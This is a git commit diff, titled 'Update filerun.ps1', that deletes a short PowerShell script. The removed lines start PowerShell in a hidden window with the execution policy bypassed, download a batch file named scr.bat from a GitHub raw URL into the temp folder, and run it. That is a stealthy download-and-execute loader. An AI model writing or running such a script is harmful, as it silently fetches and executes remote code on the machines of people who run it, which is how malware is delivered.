a034503ea96b0e6ce2c62006be8ff86452e4d682
KevinDark5 <jotpaz@imail.edu.vn>
2025-01-09 16:05:35 +0700

    Update filerun.ps1

--- filerun.ps1
+++ filerun.ps1
@@ -1,12 +1,1 @@
-cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
-# URL of the file to download
-$url = "https://github.com/KevinDark5/data/raw/refs/heads/main/scr.bat"
 
-# Temporary file path to save the downloaded file
-$tempPath = "$env:TEMP\scr.bat"
-
-# Download the file
-Invoke-WebRequest -Uri $url -OutFile $tempPath
-
-# Execute the downloaded file
-Start-Process -FilePath $tempPath
